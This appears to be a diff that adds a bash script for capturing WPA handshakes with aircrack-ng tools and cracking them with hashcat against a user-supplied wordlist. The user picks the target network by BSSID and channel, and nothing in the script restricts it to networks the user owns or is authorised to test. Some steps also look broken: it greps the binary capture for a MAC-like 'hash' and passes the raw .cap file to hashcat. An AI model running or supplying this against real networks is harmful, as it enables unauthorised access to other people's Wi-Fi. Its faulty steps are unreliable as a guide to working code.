@@ -1,0 +1,65 @@
+#!/bin/bash
+
+# Check if running as root
+if [ "$EUID" -ne 0 ]
+  then echo "Please run as root"
+  exit
+fi
+
+# Check if airmon-ng is installed
+if ! command -v airmon-ng &> /dev/null
+then
+    echo "airmon-ng could not be found. Please install aircrack-ng."
+    exit
+fi
+
+# Check if hashcat is installed
+if ! command -v hashcat &> /dev/null
+then
+    echo "hashcat could not be found. Please install hashcat."
+    exit
+fi
+
+# Check if wireless interface is provided
+if [ -z "$1" ]
+then
+    echo "Please provide a wireless interface name as argument (e.g. wlan0)"
+    exit
+fi
+
+interface=$1
+
+# Put wireless interface into monitor mode
+airmon-ng start $interface
+
+# Start capturing handshakes
+airodump-ng mon0
+
+# Ask user for BSSID and channel to target
+echo "Please enter the BSSID and channel to target (e.g. XX:XX:XX:XX:XX:XX 6): "
+read bssid channel
+
+# Set channel for capture
+iwconfig mon0 channel $channel
+
+# Start capturing handshakes for target network
+airodump-ng -c $channel --bssid $bssid -w handshake mon0
+
+# Once handshake is captured, stop capturing and stop monitor mode
+airmon-ng stop mon0
+
+# Extract hash from handshake file
+hash=$(grep -oP '([0-9A-Fa-f]{2}:){15}[0-9A-Fa-f]{2}' handshake*.cap | head -n 1)
+
+if [ -z "$hash" ]
+then
+    echo "No hash found in handshake file. Exiting."
+    exit
+fi
+
+# Ask user for wordlist to use for cracking
+echo "Please enter the path to the wordlist to use for cracking: "
+read wordlist
+
+# Crack the hash using hashcat
+hashcat -m 2500 handshake*.cap $wordlist
